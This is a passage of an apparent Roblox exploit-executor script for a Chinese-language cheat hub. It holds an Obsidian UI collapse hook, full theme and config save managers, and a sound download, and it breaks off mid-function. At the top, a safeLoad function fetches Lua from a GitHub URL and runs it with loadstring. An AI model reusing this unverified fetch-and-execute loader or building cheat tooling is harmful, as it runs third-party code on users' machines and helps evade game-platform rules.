local repo = "https://raw.githubusercontent.com/ATLASTEAM01/Obsidian/main/"
local _startTime = tick()
local _lastUpdate = "2026年10月31日20时32分"

local function safeLoad(url)
local ok, content = pcall(function()
return game:HttpGet(url)
end)
if ok and content and #content > 0 then
local fn = loadstring(content)
if fn then return fn() end
end
end

local Library = safeLoad(repo .. "Library.lua")

local _XJWCollapseHook = (function()
    local function _hookGroupbox(gb)
        if not gb or type(gb) ~= "table" then
            return gb
        end
        pcall(function()
            if gb.Collapsed ~= nil then
                return
            end
            local holder = gb.Container and gb.Container.Parent
            if not holder then
                return
            end
            local btn = Instance.new("TextButton")
            local uiMain = Library.Scheme and Library.Scheme.MainColor
            local uiFont = Library.Scheme and Library.Scheme.FontColor
            btn.BackgroundColor3 = uiMain or Color3.fromRGB(25, 25, 25)
            btn.BackgroundTransparency = 0.25
            btn.BorderSizePixel = 0
            btn.Position = UDim2.new(1, -34, 0, 0)
            btn.Size = UDim2.fromOffset(34, 34)
            btn.Text = "<"
            btn.TextSize = 10
            btn.TextColor3 = uiFont or Color3.fromRGB(255, 255, 255)
            btn.AutoButtonColor = true
            btn.Parent = holder
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 6)
            corner.Parent = btn
            local oldResize = gb.Resize
            gb.Collapsed = false
            function gb:SetCollapsed(v)
                gb.Collapsed = v
                if gb.Container then
                    gb.Container.Visible = not v
                end
                btn.Text = v and ">" or "<"
                if v then
                    if gb.Holder then
                        gb.Holder.Size = UDim2.new(1, 0, 0, 38 * Library.DPIScale)
                    end
                elseif oldResize then
                    oldResize(gb)
                end
            end
            function gb:Resize()
                if gb.Collapsed then
                    if gb.Holder then
                        gb.Holder.Size = UDim2.new(1, 0, 0, 38 * Library.DPIScale)
                    end
                elseif oldResize then
                    oldResize(gb)
                end
            end
            btn.MouseButton1Click:Connect(function()
                gb:SetCollapsed(not gb.Collapsed)
            end)
        end)
        return gb
    end
    local function _hookTab(tab)
        if not tab or type(tab) ~= "table" then
            return tab
        end
        pcall(function()
            local old = tab.AddGroupbox
            if type(old) ~= "function" then
                return
            end
            function tab:AddGroupbox(info)
                local gb = old(self, info)
                return _hookGroupbox(gb)
            end
        end)
        return tab
    end
    local function _hookWindow(win)
        if not win or type(win) ~= "table" then
            return win
        end
        pcall(function()
            local old = win.AddTab
            if type(old) ~= "function" then
                return
            end
            function win:AddTab(name, icon)
                local tab = old(self, name, icon)
                return _hookTab(tab)
            end
        end)
        return win
    end
    local oldCreate = Library.CreateWindow
    if type(oldCreate) == "function" then
        function Library:CreateWindow(info)
            local win = oldCreate(self, info)
            return _hookWindow(win)
        end
    end
end)()


local ThemeManager = (function()
local cloneref = (cloneref or clonereference or function(instance: any)
    return instance
end)
local clonefunction = (clonefunction or copyfunction or function(func) 
    return func 
end)

local HttpService: HttpService = cloneref(game:GetService("HttpService"))
local isfolder, isfile, listfiles = isfolder, isfile, listfiles

if typeof(clonefunction) == "function" then
    

    local
        isfolder_copy,
        isfile_copy,
        listfiles_copy = clonefunction(isfolder), clonefunction(isfile), clonefunction(listfiles)

    local isfolder_success, isfolder_error = pcall(function()
        return isfolder_copy("test" .. tostring(math.random(1000000, 9999999)))
    end)

    if isfolder_success == false or typeof(isfolder_error) ~= "boolean" then
        isfolder = function(folder)
            local success, data = pcall(isfolder_copy, folder)
            return (if success then data else false)
        end

        isfile = function(file)
            local success, data = pcall(isfile_copy, file)
            return (if success then data else false)
        end

        listfiles = function(folder)
            local success, data = pcall(listfiles_copy, folder)
            return (if success then data else {})
        end
    end
end

local ThemeManager = {}
do
    local ThemeFields = { "FontColor", "MainColor", "AccentColor", "BackgroundColor", "OutlineColor" }
    ThemeManager.Folder = "ObsidianLibSettings"
    

    ThemeManager.Library = nil
    ThemeManager.AppliedToTab = false
    ThemeManager.BuiltInThemes = {
        ["Default"] = {
            1,
            { FontColor = "ffffff", MainColor = "0e0e0e", AccentColor = "7d55ff", BackgroundColor = "080808", OutlineColor = "181818" },
        },
        ["BBot"] = {
            2,
            { FontColor = "ffffff", MainColor = "1e1e1e", AccentColor = "7e48a3", BackgroundColor = "232323", OutlineColor = "141414" },
        },
        ["Fatality"] = {
            3,
            { FontColor = "ffffff", MainColor = "1e1842", AccentColor = "c50754", BackgroundColor = "191335", OutlineColor = "3c355d" },
        },
        ["Jester"] = {
            4,
            { FontColor = "ffffff", MainColor = "242424", AccentColor = "db4467", BackgroundColor = "1c1c1c", OutlineColor = "373737" },
        },
        ["Mint"] = {
            5,
            { FontColor = "ffffff", MainColor = "242424", AccentColor = "3db488", BackgroundColor = "1c1c1c", OutlineColor = "373737" },
        },
        ["Tokyo Night"] = {
            6,
            { FontColor = "ffffff", MainColor = "191925", AccentColor = "6759b3", BackgroundColor = "16161f", OutlineColor = "323232" },
        },
        ["Ubuntu"] = {
            7,
            { FontColor = "ffffff", MainColor = "3e3e3e", AccentColor = "e2581e", BackgroundColor = "323232", OutlineColor = "191919" },
        },
        ["Quartz"] = {
            8,
            { FontColor = "ffffff", MainColor = "232330", AccentColor = "426e87", BackgroundColor = "1d1b26", OutlineColor = "27232f" },
        },
        ["Nord"] = {
            9,
            { FontColor = "eceff4", MainColor = "3b4252", AccentColor = "88c0d0", BackgroundColor = "2e3440", OutlineColor = "4c566a" },
        },
        ["Dracula"] = {
            10,
            { FontColor = "f8f8f2", MainColor = "44475a", AccentColor = "ff79c6", BackgroundColor = "282a36", OutlineColor = "6272a4" },
        },
        ["Monokai"] = {
            11,
            { FontColor = "f8f8f2", MainColor = "272822", AccentColor = "f92672", BackgroundColor = "1e1f1c", OutlineColor = "49483e" },
        },
        ["Gruvbox"] = {
            12,
            { FontColor = "ebdbb2", MainColor = "3c3836", AccentColor = "fb4934", BackgroundColor = "282828", OutlineColor = "504945" },
        },
        ["Solarized"] = {
            13,
            { FontColor = "839496", MainColor = "073642", AccentColor = "cb4b16", BackgroundColor = "002b36", OutlineColor = "586e75" },
        },
        ["Catppuccin"] = {
            14,
            { FontColor = "d9e0ee", MainColor = "302d41", AccentColor = "f5c2e7", BackgroundColor = "1e1e2e", OutlineColor = "575268" },
        },
        ["One Dark"] = {
            15,
            { FontColor = "abb2bf", MainColor = "282c34", AccentColor = "c678dd", BackgroundColor = "21252b", OutlineColor = "5c6370" },
        },
        ["Cyberpunk"] = {
            16,
            { FontColor = "f9f9f9", MainColor = "262335", AccentColor = "00ff9f", BackgroundColor = "1a1a2e", OutlineColor = "413c5e" },
        },
        ["Oceanic Next"] = {
            17,
            { FontColor = "d8dee9", MainColor = "1b2b34", AccentColor = "6699cc", BackgroundColor = "16232a", OutlineColor = "343d46" },
        },
        ["Material"] = {
            18,
            { FontColor = "eeffff", MainColor = "212121", AccentColor = "82aaff", BackgroundColor = "151515", OutlineColor = "424242" },
        }
    }

    function ThemeManager:SetLibrary(library)
        self.Library = library
    end

    
    function ThemeManager:GetPaths()
        local paths = {}

        local parts = self.Folder:split("/")
        for idx = 1, #parts do
            paths[#paths + 1] = table.concat(parts, "/", 1, idx)
        end

        paths[#paths + 1] = self.Folder .. "/themes"

        return paths
    end

    function ThemeManager:BuildFolderTree()
        local paths = self:GetPaths()

        for i = 1, #paths do
            local str = paths[i]
            if isfolder(str) then
                continue
            end
            makefolder(str)
        end
    end

    function ThemeManager:CheckFolderTree()
        if isfolder(self.Folder) then
            return
        end
        self:BuildFolderTree()

        task.wait(0.1)
    end

    function ThemeManager:SetFolder(folder)
        self.Folder = folder
        self:BuildFolderTree()
    end

    
    function ThemeManager:ApplyTheme(theme)
        local customThemeData = self:GetCustomTheme(theme)
        local data = customThemeData or self.BuiltInThemes[theme]

        if not data then
            return
        end

        local scheme = data[2]
        for idx, val in pairs(customThemeData or scheme) do
            if idx == "VideoLink" then
                continue
            elseif idx == "FontFace" then
                self.Library:SetFont(Enum.Font[val])

                if self.Library.Options[idx] then
                    self.Library.Options[idx]:SetValue(val)
                end
            else
                self.Library.Scheme[idx] = Color3.fromHex(val)

                if self.Library.Options[idx] then
                    self.Library.Options[idx]:SetValueRGB(Color3.fromHex(val))
                end
            end
        end

        self:ThemeUpdate()
    end

    function ThemeManager:ThemeUpdate()
        for i, field in ThemeFields do
            if self.Library.Options and self.Library.Options[field] then
                self.Library.Scheme[field] = self.Library.Options[field].Value
            end
        end

        self.Library:UpdateColorsUsingRegistry()
    end

    
    function ThemeManager:GetCustomTheme(file)
        local path = self.Folder .. "/themes/" .. file .. ".json"
        if not isfile(path) then
            return nil
        end

        local data = readfile(path)
        local success, decoded = pcall(HttpService.JSONDecode, HttpService, data)

        if not success then
            return nil
        end

        return decoded
    end

    function ThemeManager:LoadDefault()
        local theme = "Default"
        local content = isfile(self.Folder .. "/themes/default.txt") and readfile(self.Folder .. "/themes/default.txt")

        local isDefault = true
        if content then
            if self.BuiltInThemes[content] then
                theme = content
            elseif self:GetCustomTheme(content) then
                theme = content
                isDefault = false
            end
        elseif self.BuiltInThemes[self.DefaultTheme] then
            theme = self.DefaultTheme
        end

        if isDefault then
            self.Library.Options.ThemeManager_ThemeList:SetValue(theme)
        else
            self:ApplyTheme(theme)
        end
    end

    function ThemeManager:SaveDefault(theme)
        writefile(self.Folder .. "/themes/default.txt", theme)
    end

    function ThemeManager:SetDefaultTheme(theme)
        assert(self.Library, "Must set ThemeManager.Library first!")
        assert(not self.AppliedToTab, "Cannot set default theme after applying ThemeManager to a tab!")

        local FinalTheme = {}
        local LibraryScheme = {}
        for _, field in ThemeFields do
            if typeof(theme[field]) == "Color3" then
                FinalTheme[field] = "#" .. theme[field]:ToHex()
                LibraryScheme[field] = theme[field]

            elseif typeof(theme[field]) == "string" then
                FinalTheme[field] = if theme[field]:sub(1, 1) == "#" then theme[field] else ("#" .. theme[field])
                LibraryScheme[field] = Color3.fromHex(theme[field])

            else
                FinalTheme[field] = ThemeManager.BuiltInThemes["Default"][2][field]
                LibraryScheme[field] = Color3.fromHex(ThemeManager.BuiltInThemes["Default"][2][field])
            end
        end

        if typeof(theme["FontFace"]) == "EnumItem" then
            FinalTheme["FontFace"] = theme["FontFace"].Name
            LibraryScheme["Font"] = Font.fromEnum(theme["FontFace"])

        elseif typeof(theme["FontFace"]) == "string" then
            FinalTheme["FontFace"] = theme["FontFace"]
            LibraryScheme["Font"] = Font.fromEnum(Enum.Font[theme["FontFace"]])

        else
            FinalTheme["FontFace"] = "Code"
            LibraryScheme["Font"] = Font.fromEnum(Enum.Font.Code)
        end

        for _, field in { "Red", "Dark", "White" } do
            LibraryScheme[field] = self.Library.Scheme[field]
        end

        self.Library.Scheme = LibraryScheme
        self.BuiltInThemes["Default"] = { 1, FinalTheme }

        self.Library:UpdateColorsUsingRegistry()
    end

    function ThemeManager:SaveCustomTheme(file)
        if file:gsub(" ", "") == "" then
            self.Library:Notify("主题文件名无效（为空）", 3)
            return
        end

        local theme = {}
        for _, field in ThemeFields do
            theme[field] = self.Library.Options[field].Value:ToHex()
        end
        theme["FontFace"] = self.Library.Options["FontFace"].Value

        writefile(self.Folder .. "/themes/" .. file .. ".json", HttpService:JSONEncode(theme))
    end

    function ThemeManager:Delete(name)
        if not name then
            return false, "no config file is selected"
        end

        local file = self.Folder .. "/themes/" .. name .. ".json"
        if not isfile(file) then
            return false, "invalid file"
        end

        local success = pcall(delfile, file)
        if not success then
            return false, "delete file error"
        end

        return true
    end

    function ThemeManager:ReloadCustomThemes()
        local list = listfiles(self.Folder .. "/themes")

        local out = {}
        for i = 1, #list do
            local file = list[i]
            if file:sub(-5) == ".json" then
                

                local pos = file:find(".json", 1, true)
                local start = pos

                local char = file:sub(pos, pos)
                while char ~= "/" and char ~= "\\" and char ~= "" do
                    pos = pos - 1
                    char = file:sub(pos, pos)
                end

                if char == "/" or char == "\\" then
                    table.insert(out, file:sub(pos + 1, start - 1))
                end
            end
        end

        return out
    end

    
    function ThemeManager:CreateThemeManager(groupbox)
        groupbox
            :AddLabel("背景颜色")
            :AddColorPicker("BackgroundColor", { Default = self.Library.Scheme.BackgroundColor })
        groupbox:AddLabel("主颜色"):AddColorPicker("MainColor", { Default = self.Library.Scheme.MainColor })
        groupbox:AddLabel("强调色"):AddColorPicker("AccentColor", { Default = self.Library.Scheme.AccentColor })
        groupbox
            :AddLabel("描边颜色")
            :AddColorPicker("OutlineColor", { Default = self.Library.Scheme.OutlineColor })
        groupbox:AddLabel("字体颜色"):AddColorPicker("FontColor", { Default = self.Library.Scheme.FontColor })
        groupbox:AddDropdown("FontFace", {
            Text = "字体",
            Default = "SourceSans",
            Values = { "BuilderSans", "Code", "Fantasy", "Gotham", "Jura", "Roboto", "RobotoMono", "SourceSans" },
        })

        local ThemesArray = {}
        for Name, Theme in pairs(self.BuiltInThemes) do
            table.insert(ThemesArray, Name)
        end

        table.sort(ThemesArray, function(a, b)
            return self.BuiltInThemes[a][1] < self.BuiltInThemes[b][1]
        end)

        groupbox:AddDivider()

        groupbox:AddDropdown("ThemeManager_ThemeList", { Text = "主题列表", Values = ThemesArray, Default = 1 })
        groupbox:AddButton("设为默认", function()
            self:SaveDefault(self.Library.Options.ThemeManager_ThemeList.Value)
            self.Library:Notify(
                string.format("已将默认主题设为 %q", self.Library.Options.ThemeManager_ThemeList.Value)
            )
        end)

        self.Library.Options.ThemeManager_ThemeList:OnChanged(function()
            self:ApplyTheme(self.Library.Options.ThemeManager_ThemeList.Value)
        end)

        groupbox:AddDivider()

        groupbox:AddInput("ThemeManager_CustomThemeName", { Text = "自定义主题名称" })
        groupbox:AddButton("创建主题", function()
            local name = self.Library.Options.ThemeManager_CustomThemeName.Value

            if name:gsub(" ", "") == "" then
                self.Library:Notify("主题名称无效（为空）", 2)
                return
            end

            self:SaveCustomTheme(name)

            self.Library:Notify(string.format("已创建主题 %q", name))
            self.Library.Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
            self.Library.Options.ThemeManager_CustomThemeList:SetValue(nil)
        end)

        groupbox:AddDivider()

        groupbox:AddDropdown(
            "ThemeManager_CustomThemeList",
            { Text = "自定义主题", Values = self:ReloadCustomThemes(), AllowNull = true, Default = 1 }
        )
        groupbox:AddButton("加载主题", function()
            local name = self.Library.Options.ThemeManager_CustomThemeList.Value

            self:ApplyTheme(name)
            self.Library:Notify(string.format("已加载主题 %q", name))
        end)
        groupbox:AddButton("覆盖主题", function()
            local name = self.Library.Options.ThemeManager_CustomThemeList.Value

            self:SaveCustomTheme(name)
            self.Library:Notify(string.format("已覆盖主题 %q", name))
        end)
        groupbox:AddButton("删除主题", function()
            local name = self.Library.Options.ThemeManager_CustomThemeList.Value

            local success, err = self:Delete(name)
            if not success then
                self.Library:Notify("删除主题失败：" .. err)
                return
            end

            self.Library:Notify(string.format("已删除主题 %q", name))
            self.Library.Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
            self.Library.Options.ThemeManager_CustomThemeList:SetValue(nil)
        end)
        groupbox:AddButton("刷新列表", function()
            self.Library.Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
            self.Library.Options.ThemeManager_CustomThemeList:SetValue(nil)
        end)
        groupbox:AddButton("设为默认", function()
            if
                self.Library.Options.ThemeManager_CustomThemeList.Value ~= nil
                and self.Library.Options.ThemeManager_CustomThemeList.Value ~= ""
            then
                self:SaveDefault(self.Library.Options.ThemeManager_CustomThemeList.Value)
                self.Library:Notify(
                    string.format("已将默认主题设为 %q", self.Library.Options.ThemeManager_CustomThemeList.Value)
                )
            end
        end)
        groupbox:AddButton("重置默认", function()
            local success = pcall(delfile, self.Folder .. "/themes/default.txt")
            if not success then
                self.Library:Notify("重置默认失败：删除文件错误")
                return
            end

            self.Library:Notify("已清除默认主题")
            self.Library.Options.ThemeManager_CustomThemeList:SetValues(self:ReloadCustomThemes())
            self.Library.Options.ThemeManager_CustomThemeList:SetValue(nil)
        end)

        self:LoadDefault()
        self.AppliedToTab = true

        local function UpdateTheme()
            self:ThemeUpdate()
        end

        self.Library.Options.BackgroundColor:OnChanged(UpdateTheme)
        self.Library.Options.MainColor:OnChanged(UpdateTheme)
        self.Library.Options.AccentColor:OnChanged(UpdateTheme)
        self.Library.Options.OutlineColor:OnChanged(UpdateTheme)
        self.Library.Options.FontColor:OnChanged(UpdateTheme)
        self.Library.Options.FontFace:OnChanged(function(Value)
            self.Library:SetFont(Enum.Font[Value])
            self.Library:UpdateColorsUsingRegistry()
        end)
    end

    function ThemeManager:CreateGroupBox(tab)
        assert(self.Library, "Must set ThemeManager.Library first!")
        return tab:AddLeftGroupbox("主题", "paintbrush")
    end

    function ThemeManager:ApplyToTab(tab)
        assert(self.Library, "Must set ThemeManager.Library first!")
        local groupbox = self:CreateGroupBox(tab)
        self:CreateThemeManager(groupbox)
    end

    function ThemeManager:ApplyToGroupbox(groupbox)
        assert(self.Library, "Must set ThemeManager.Library first!")
        self:CreateThemeManager(groupbox)
    end

    ThemeManager:BuildFolderTree()
end

getgenv().ObsidianThemeManager = ThemeManager
return ThemeManager

end)()

local SaveManager = (function()
local cloneref = (cloneref or clonereference or function(instance: any)
    return instance
end)
local clonefunction = (clonefunction or copyfunction or function(func) 
    return func 
end)

local HttpService: HttpService = cloneref(game:GetService("HttpService"))
local isfolder, isfile, listfiles = isfolder, isfile, listfiles

if typeof(clonefunction) == "function" then
    

    local
        isfolder_copy,
        isfile_copy,
        listfiles_copy = clonefunction(isfolder), clonefunction(isfile), clonefunction(listfiles)

    local isfolder_success, isfolder_error = pcall(function()
        return isfolder_copy("test" .. tostring(math.random(1000000, 9999999)))
    end)

    if isfolder_success == false or typeof(isfolder_error) ~= "boolean" then
        isfolder = function(folder)
            local success, data = pcall(isfolder_copy, folder)
            return (if success then data else false)
        end

        isfile = function(file)
            local success, data = pcall(isfile_copy, file)
            return (if success then data else false)
        end

        listfiles = function(folder)
            local success, data = pcall(listfiles_copy, folder)
            return (if success then data else {})
        end
    end
end

local SaveManager = {} do
    SaveManager.Folder = "ObsidianLibSettings"
    SaveManager.SubFolder = ""
    SaveManager.Ignore = {}
    SaveManager.Library = nil
    SaveManager.Parser = {
        Toggle = {
            Save = function(idx, object)
                return { type = "Toggle", idx = idx, value = object.Value }
            end,
            Load = function(idx, data)
                local object = SaveManager.Library.Toggles[idx]
                if object and object.Value ~= data.value then
                    object:SetValue(data.value)
                end
            end,
        },
        Slider = {
            Save = function(idx, object)
                return { type = "Slider", idx = idx, value = tostring(object.Value) }
            end,
            Load = function(idx, data)
                local object = SaveManager.Library.Options[idx]
                if object and object.Value ~= data.value then
                    object:SetValue(data.value)
                end
            end,
        },
        Dropdown = {
            Save = function(idx, object)
                return { type = "Dropdown", idx = idx, value = object.Value, mutli = object.Multi }
            end,
            Load = function(idx, data)
                local object = SaveManager.Library.Options[idx]
                if object and object.Value ~= data.value then
                    object:SetValue(data.value)
                end
            end,
        },
        ColorPicker = {
            Save = function(idx, object)
                return { type = "ColorPicker", idx = idx, value = object.Value:ToHex(), transparency = object.Transparency }
            end,
            Load = function(idx, data)
                if SaveManager.Library.Options[idx] then
                    SaveManager.Library.Options[idx]:SetValueRGB(Color3.fromHex(data.value), data.transparency)
                end
            end,
        },
        KeyPicker = {
            Save = function(idx, object)
                return { type = "KeyPicker", idx = idx, mode = object.Mode, key = object.Value, modifiers = object.Modifiers }
            end,
            Load = function(idx, data)
                if SaveManager.Library.Options[idx] then
                    SaveManager.Library.Options[idx]:SetValue({ data.key, data.mode, data.modifiers })
                end
            end,
        },
        Input = {
            Save = function(idx, object)
                return { type = "Input", idx = idx, text = object.Value }
            end,
            Load = function(idx, data)
                local object = SaveManager.Library.Options[idx]
                if object and object.Value ~= data.text and type(data.text) == "string" then
                    SaveManager.Library.Options[idx]:SetValue(data.text)
                end
            end,
        },
    }

    function SaveManager:SetLibrary(library)
        self.Library = library
    end

    function SaveManager:IgnoreThemeSettings()
        self:SetIgnoreIndexes({
            "BackgroundColor", "MainColor", "AccentColor", "OutlineColor", "FontColor", "FontFace", 
            "ThemeManager_ThemeList", "ThemeManager_CustomThemeList", "ThemeManager_CustomThemeName", 
        })
    end

    
    function SaveManager:CheckSubFolder(createFolder)
        if typeof(self.SubFolder) ~= "string" or self.SubFolder == "" then return false end

        if createFolder == true then
            if not isfolder(self.Folder .. "/settings/" .. self.SubFolder) then
                makefolder(self.Folder .. "/settings/" .. self.SubFolder)
            end
        end

        return true
    end

    function SaveManager:GetPaths()
        local paths = {}

        local parts = self.Folder:split("/")
        for idx = 1, #parts do
            local path = table.concat(parts, "/", 1, idx)
            if not table.find(paths, path) then paths[#paths + 1] = path end
        end

        paths[#paths + 1] = self.Folder .. "/themes"
        paths[#paths + 1] = self.Folder .. "/settings"

        if self:CheckSubFolder(false) then
            local subFolder = self.Folder .. "/settings/" .. self.SubFolder
            parts = subFolder:split("/")

            for idx = 1, #parts do
                local path = table.concat(parts, "/", 1, idx)
                if not table.find(paths, path) then paths[#paths + 1] = path end
            end
        end

        return paths
    end

    function SaveManager:BuildFolderTree()
        local paths = self:GetPaths()

        for i = 1, #paths do
            local str = paths[i]
            if isfolder(str) then continue end

            makefolder(str)
        end
    end

    function SaveManager:CheckFolderTree()
        if isfolder(self.Folder) then return end
        SaveManager:BuildFolderTree()

        task.wait(0.1)
    end

    function SaveManager:SetIgnoreIndexes(list)
        for _, key in pairs(list) do
            self.Ignore[key] = true
        end
    end

    function SaveManager:SetFolder(folder)
        self.Folder = folder
        self:BuildFolderTree()
    end

    function SaveManager:SetSubFolder(folder)
        self.SubFolder = folder
        self:BuildFolderTree()
    end

    
    function SaveManager:Save(name)
        if (not name) then
            return false, "no config file is selected"
        end
        SaveManager:CheckFolderTree()

        local fullPath = self.Folder .. "/settings/" .. name .. ".json"
        if SaveManager:CheckSubFolder(true) then
            fullPath = self.Folder .. "/settings/" .. self.SubFolder .. "/" .. name .. ".json"
        end

        local data = {
            objects = {}
        }

        for idx, toggle in pairs(self.Library.Toggles) do
            if not toggle.Type then continue end
            if not self.Parser[toggle.Type] then continue end
            if self.Ignore[idx] then continue end

            table.insert(data.objects, self.Parser[toggle.Type].Save(idx, toggle))
        end

        for idx, option in pairs(self.Library.Options) do
            if not option.Type then continue end
            if not self.Parser[option.Type] then continue end
            if self.Ignore[idx] then continue end

            table.insert(data.objects, self.Parser[option.Type].Save(idx, option))
        end

        local success, encoded = pcall(HttpService.JSONEncode, HttpService, data)
        if not success then
            return false, "failed to encode data"
        end

        writefile(fullPath, encoded)
        return true
    end

    function SaveManager:Load(name)
        if (not name) then
            return false, "no config file is selected"
        end
        SaveManager:CheckFolderTree()

        local file = self.Folder .. "/settings/" .. name .. ".json"
        if SaveManager:CheckSubFolder(true) then
            file = self.Folder .. "/settings/" .. self.SubFolder .. "/" .. name .. ".json"
        end

        if not isfile(file) then return false, "invalid file" end

        local success, decoded = pcall(HttpService.JSONDecode, HttpService, readfile(file))
        if not success then return false, "decode error" end

        for _, option in pairs(decoded.objects) do
            if not option.type then continue end
            if not self.Parser[option.type] then continue end
            if self.Ignore[option.idx] then continue end

            task.spawn(self.Parser[option.type].Load, option.idx, option) 
        end

        return true
    end

    function SaveManager:Delete(name)
        if (not name) then
            return false, "no config file is selected"
        end

        local file = self.Folder .. "/settings/" .. name .. ".json"
        if SaveManager:CheckSubFolder(true) then
            file = self.Folder .. "/settings/" .. self.SubFolder .. "/" .. name .. ".json"
        end

        if not isfile(file) then return false, "invalid file" end

        local success = pcall(delfile, file)
        if not success then return false, "delete file error" end

        return true
    end

    function SaveManager:RefreshConfigList()
        local success, data = pcall(function()
            SaveManager:CheckFolderTree()

            local list = {}
            local out = {}

            if SaveManager:CheckSubFolder(true) then
                list = listfiles(self.Folder .. "/settings/" .. self.SubFolder)
            else
                list = listfiles(self.Folder .. "/settings")
            end
            if typeof(list) ~= "table" then list = {} end

            for i = 1, #list do
                local file = list[i]
                if file:sub(-5) == ".json" then
                    

                    local pos = file:find(".json", 1, true)
                    local start = pos

                    local char = file:sub(pos, pos)
                    while char ~= "/" and char ~= "\\" and char ~= "" do
                        pos = pos - 1
                        char = file:sub(pos, pos)
                    end

                    if char == "/" or char == "\\" then
                        table.insert(out, file:sub(pos + 1, start - 1))
                    end
                end
            end

            return out
        end)

        if (not success) then
            if self.Library then
                self.Library:Notify("Failed to load config list: " .. tostring(data))
            else
                warn("Failed to load config list: " .. tostring(data))
            end

            return {}
        end

        return data
    end

    
    function SaveManager:GetAutoloadConfig()
        SaveManager:CheckFolderTree()

        local autoLoadPath = self.Folder .. "/settings/autoload.txt"
        if SaveManager:CheckSubFolder(true) then
            autoLoadPath = self.Folder .. "/settings/" .. self.SubFolder .. "/autoload.txt"
        end

        if isfile(autoLoadPath) then
            local successRead, name = pcall(readfile, autoLoadPath)
            if not successRead then
                return "none"
            end

            name = tostring(name)
            return if name == "" then "none" else name
        end

        return "none"
    end

    function SaveManager:LoadAutoloadConfig()
        SaveManager:CheckFolderTree()

        local autoLoadPath = self.Folder .. "/settings/autoload.txt"
        if SaveManager:CheckSubFolder(true) then
            autoLoadPath = self.Folder .. "/settings/" .. self.SubFolder .. "/autoload.txt"
        end

        if isfile(autoLoadPath) then
            local successRead, name = pcall(readfile, autoLoadPath)
            if not successRead then
                self.Library:Notify("Failed to load autoload config: write file error")
                return
            end

            local success, err = self:Load(name)
            if not success then
                self.Library:Notify("Failed to load autoload config: " .. err)
                return
            end

            self.Library:Notify(string.format("Auto loaded config %q", name))
        end
    end

    function SaveManager:SaveAutoloadConfig(name)
        SaveManager:CheckFolderTree()

        local autoLoadPath = self.Folder .. "/settings/autoload.txt"
        if SaveManager:CheckSubFolder(true) then
            autoLoadPath = self.Folder .. "/settings/" .. self.SubFolder .. "/autoload.txt"
        end

        local success = pcall(writefile, autoLoadPath, name)
        if not success then return false, "write file error" end

        return true, ""
    end

    function SaveManager:DeleteAutoLoadConfig()
        SaveManager:CheckFolderTree()

        local autoLoadPath = self.Folder .. "/settings/autoload.txt"
        if SaveManager:CheckSubFolder(true) then
            autoLoadPath = self.Folder .. "/settings/" .. self.SubFolder .. "/autoload.txt"
        end

        local success = pcall(delfile, autoLoadPath)
        if not success then return false, "delete file error" end

        return true, ""
    end

    
    function SaveManager:BuildConfigSection(tab)
        assert(self.Library, "Must set SaveManager.Library")

        local section = tab:AddRightGroupbox("配置", "folder-cog")

        section:AddInput("SaveManager_ConfigName",    { Text = "配置名称" })
        section:AddButton("创建配置", function()
            local name = self.Library.Options.SaveManager_ConfigName.Value

            if name:gsub(" ", "") == "" then
                self.Library:Notify("配置名称无效（为空）", 2)
                return
            end

            local success, err = self:Save(name)
            if not success then
                self.Library:Notify("创建配置失败：" .. err)
                return
            end

            self.Library:Notify(string.format("已创建配置 %q", name))
            self.Library.Options.SaveManager_ConfigList:SetValues(self:RefreshConfigList())
            self.Library.Options.SaveManager_ConfigList:SetValue(nil)
        end)

        section:AddDivider()

        section:AddDropdown("SaveManager_ConfigList", { Text = "配置列表", Values = self:RefreshConfigList(), AllowNull = true })
        section:AddButton("加载配置", function()
            local name = self.Library.Options.SaveManager_ConfigList.Value

            local success, err = self:Load(name)
            if not success then
                self.Library:Notify("加载配置失败：" .. err)
                return
            end

            self.Library:Notify(string.format("已加载配置 %q", name))
        end)
        section:AddButton("覆盖配置", function()
            local name = self.Library.Options.SaveManager_ConfigList.Value

            local success, err = self:Save(name)
            if not success then
                self.Library:Notify("覆盖配置失败：" .. err)
                return
            end

            self.Library:Notify(string.format("已覆盖配置 %q", name))
        end)

        section:AddButton("删除配置", function()
            local name = self.Library.Options.SaveManager_ConfigList.Value

            local success, err = self:Delete(name)
            if not success then
                self.Library:Notify("删除配置失败：" .. err)
                return
            end

            self.Library:Notify(string.format("已删除配置 %q", name))
            self.Library.Options.SaveManager_ConfigList:SetValues(self:RefreshConfigList())
            self.Library.Options.SaveManager_ConfigList:SetValue(nil)
        end)

        section:AddButton("刷新列表", function()
            self.Library.Options.SaveManager_ConfigList:SetValues(self:RefreshConfigList())
            self.Library.Options.SaveManager_ConfigList:SetValue(nil)
        end)

        section:AddButton("设为自动加载", function()
            local name = self.Library.Options.SaveManager_ConfigList.Value

            local success, err = self:SaveAutoloadConfig(name)
            if not success then
                self.Library:Notify("设置自动加载失败：" .. err)
                return
            end

            self.Library:Notify(string.format("已将 %q 设为自动加载", name))
            self.AutoloadConfigLabel:SetText("当前自动加载配置：" .. name)
        end)
        section:AddButton("重置自动加载", function()
            local success, err = self:DeleteAutoLoadConfig()
            if not success then
                self.Library:Notify("设置自动加载失败：" .. err)
                return
            end

            self.Library:Notify("已清除自动加载")
            self.AutoloadConfigLabel:SetText("当前自动加载配置：无")
        end)

        self.AutoloadConfigLabel = section:AddLabel("当前自动加载配置：" .. self:GetAutoloadConfig(), true)

        
        self:SetIgnoreIndexes({ "SaveManager_ConfigList", "SaveManager_ConfigName" })
    end

    SaveManager:BuildFolderTree()
end

return SaveManager

end)()

local Options = Library.Options
local Toggles = Library.Toggles

local Window = Library:CreateWindow({ Title = "XJW中心", Footer = "XJW", Center = true, AutoShow = false })

local _XJWSnd = (function()
	local on = true
	local sndDing = nil
	local function asset(path)
		local ok, a = pcall(getcustomasset, path)
		if ok and a then
			return a
		end
	end
	task.spawn(function()
		local ok, result = pcall(game.HttpGet, game, "https://raw.githubusercontent.com/kongbaNB/TB/refs/heads/main/DING.WAV")
		if ok and result then
			pcall(function()
				if makefolder and not isfolder("恐脚本") then
					makefolder("恐脚本")
				end
				writefile("恐脚本/DING.WAV", result)
			end)
			local a = asset("恐脚本/DING.WAV")
			if a then
				sndDing = a
			end
		end
	end)
	local function play()
		if not on then
			return
		end
		if not sndDing then
			sndDing = asset("恐脚本/DING.WAV")
		end
		if not sndDing then
			return
		end
		pcall(function()
			local s = Instance.new("Sound")
			s.SoundId = sndDing
